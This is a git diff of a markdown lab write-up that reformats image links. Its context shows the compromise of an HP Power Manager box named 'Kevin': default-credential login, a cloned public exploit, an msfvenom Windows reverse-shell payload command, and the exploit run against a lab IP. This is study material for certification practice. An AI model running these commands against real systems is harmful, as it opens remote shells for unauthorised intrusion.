@@ -45,7 +45,7 @@ PORT      STATE SERVICE      VERSION
 
 
 
-![[hp-login.png]]
+![HP Power Manager Login](Attachments/hp-login.png)
 - We don't have any credentials, so easiest thing to do is try **default creds**
 
 ``` shell
@@ -55,14 +55,16 @@ admin
 ```
 
 
-![[hp-admin-panel.png]]
+![HP Admin Panel](Attachments/hp-admin-panel.png)
 
 - I start to snoop around click on the r`emote agent not connected`, looks interesting
-![[Kevin.png]]
+![Kevin](Attachments/Kevin.png)
+
 
 - Looking around more for a version number and find this:
 
-![[writeups/Kevin/Attachments/hp-version.png]]
+![HP Power Manager Version](Attachments/hp-version.png)
+
 
 # Exploit
 
@@ -74,7 +76,7 @@ admin
 - A programmer was kind enough to port the python 2 exploit to python 3
 - *note* This is also a module in Metasploit aka msfconsole, but I wanted to stay away from metasploit since it can only be used sparingly on the exam PEN-200.
 ## Download and learn
-![[git-clone.png]]
+![Git Clone](Attachments/git-clone.png)
 
 - Clone the repo
 ``` shell
@@ -89,7 +91,7 @@ nano exploit.py
 
 - Open the exploit code with nano to check out the README so I can get a better idea of how to use the exploit
 
-![[writeups/Kevin/Attachments/readme.png]]
+![README](Attachments/readme.png)
 
 ## Crafting the exploit
 - The README tells us to:
@@ -101,7 +103,7 @@ nano exploit.py
 msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
 ```
 
-![[payload.png]]
+![Payload](Attachments/payload.png)
 
 - I go ahead and replace the placeholder in the script with bytes crafted for me by msfvenom
 - And run the script 
@@ -112,15 +114,14 @@ python3 hp_pm_exploit_p3.py 192.168.136.45 80 4444
 ```
 ### error
 
-![[writeups/Kevin/Attachments/error.png]]
+![Error](Attachments/error.png)
 - Python is throwing an error because it cant change strings into bytes.. after some googling I remove the 'b' at the beginning of each line:
 
-![[py-exploit.png]]
+![Python Exploit](Attachments/py-exploit.png)
 
 # Rooted and tooted
 
-![[Kevin-1.png]]
-
+![Rooted Kevin](Attachments/Kevin-1.png)
 Boom. It worked.
 
 [Flag Redacted]
